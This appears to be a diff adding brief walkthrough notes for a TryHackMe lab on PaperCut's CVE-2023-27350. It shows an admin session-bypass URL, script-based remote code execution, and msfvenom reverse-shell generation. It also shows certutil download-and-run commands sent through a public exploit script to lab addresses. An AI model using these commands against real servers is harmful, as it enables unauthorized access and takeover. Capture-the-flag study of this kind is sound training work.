@@ -1,0 +1,39 @@
+### papercut ###
+## https://tryhackme.com/r/room/papercut
+
+
+## session bypass
+# then click on login
+http://10.10.235.155:9191						# url
+http://10.10.235.155:9191/app?service=page/SetupCompleted		# be admin
+
+
+## RCE
+Click on Printers.
+Click on [Template printer].
+Click on Scripting.
+Check Enable print script.
+
+# listen
+sudo tcpdump -i tun0 icmp
+
+# exec code, it works!
+function printJobHook(inputs, actions) {
+	// your script here
+}
+java.lang.Runtime.getRuntime().exec('ping.exe 10.9.2.221');
+
+# exploit
+git clone https://github.com/horizon3ai/CVE-2023-27350			# dl tool
+cd CVE-2023-27350							# cd into dir
+msfvenom -p windows/shell/reverse_tcp -f exe LHOST=10.9.2.221 LPORT=4444 -o shell.exe
+python -m http.server 9090						# serve
+# listen
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"
+# dl rshellC
+python CVE-2023-27350.py -u http://10.10.235.155:9191 -c "certutil.exe -urlcache -f http://10.9.2.221:9090/shell.exe shell.exe"
+python CVE-2023-27350.py -u http://10.10.235.155:9191 -c "cmd.exe /c shell.exe"
+
+
+
+
